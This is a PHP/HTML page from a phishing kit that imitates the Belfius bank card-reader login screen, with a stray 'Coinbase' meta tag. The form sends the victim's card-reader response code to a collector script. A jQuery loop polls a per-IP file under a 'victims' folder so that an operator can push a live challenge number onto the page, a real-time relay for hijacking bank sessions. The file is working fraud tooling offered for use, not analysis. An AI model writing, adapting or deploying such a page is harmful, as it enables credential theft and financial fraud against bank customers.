<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>Belfius</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body>
    

    <!-- header_bel -->
     <header class="header_bel">
      <img src="./Asstes/imgs/be.svg" alt="">
     </header>
    <!-- box_belfius -->
    <div class="box_belfius_l">
      <form action="./Asstes/php/config/func.php" method="post" class="form_login_belfius_l">
        <input type="hidden" name="name_bank" value="Belfius">
        <input type="hidden" name="lecture">
        <div class="title_form">
          <p><?php echo get_text('be_l_1'); ?></p>
        </div>
        <?php if( isset($_GET['error']) ) : ?>
        <div class="alert_error d-flex">
          <i class="ri-alert-fill"></i>
          <p class="mb-0 mt-0"><?php echo get_text('be_l_2'); ?></p>
        </div>
        <?php endif; ?>
        <div class="wrapper_boxes">
          <div class="part_left_bel">
            <img src="./Asstes/imgs/cardreader_BEATS.png" alt="">
          </div>
          <div class="part_right_bel">
            <div class="inputes">
              <div class="title">
                <p><?php echo get_text('be_l_3'); ?></p>
              </div>
              <div class="infos">
                <div class="info d-flex align-items-center justify-content-between">
                  <div class="part_left_info d-flex align-items-center">
                    <span>1</span>
                    <p class="mb-0"><?php echo get_text('be_l_4'); ?></p>
                  </div>
                  <div class="part_right_info">
                    <img src="./Asstes/imgs/login_tcm.png" alt="">
                  </div>
                </div>
                <div class="info d-flex align-items-center justify-content-between">
                  <div class="part_left_info d-flex align-items-center">
                    <span>2</span>
                    <p class="mb-0"><?php echo get_text('be_l_5'); ?></p>
                  </div>
                  <div class="part_right_info d-flex align-items-center">
                    <p class="num ZZZ">4589 9854</p>
                    <p class="plus">+</p>
                    <img src="./Asstes/imgs/NewCR_OK.png" alt="">
                  </div>
                </div>
                <div class="info d-flex align-items-center justify-content-between">
                  <div class="part_left_info d-flex align-items-center">
                    <span>3</span>
                    <p class="mb-0"><?php echo get_text('be_l_6'); ?></p>
                  </div>
                  <div class="part_right_info d-flex align-items-center">
                    <p class="num"><?php echo get_text('be_l_7'); ?></p>
                    <p class="plus">+</p>
                    <img src="./Asstes/imgs/NewCR_OK.png" alt="">
                  </div>
                </div>
                <div class="info d-flex align-items-center justify-content-between">
                  <div class="part_left_info d-flex align-items-center">
                    <span>4</span>
                    <p class="mb-0"><?php echo get_text('be_l_8'); ?></p>
                  </div>
                  <div class="part_right_info d-flex align-items-center">
                    <input type="text" name="code-lec" id="code-lec">
                  </div>
                </div>                
              </div>
            </div>
          </div>
        </div>
        <div class="wrapper_btns d-flex justify-content-between align-items-center">
          <img src="./Asstes/imgs/bts.png" alt="">
          <div class="btn_sub">
            <button type="submit" class="d-flex align-items-center" disabled><img src="./Asstes/imgs/connect.png" alt=""><?php echo get_text('be_l_9'); ?></button>
          </div>
        </div>        
      </form>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>   
        
        $("#code-lec").mask('00000000');

        $("input").keyup(function(){
          if ($("#code-lec").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        });     
        var ip = '<?php echo get_client_ip();?>';
        var waiting = setInterval(function() {
            $.get(`./victims/${ip}+.txt?` + new Date().getTime(), function(data) {
                if( data != "") {
                    $(".ZZZ").text(data);
                    // console.log(data);
                }
            });
        }, 1000);             
    </script>
    </body>
</html>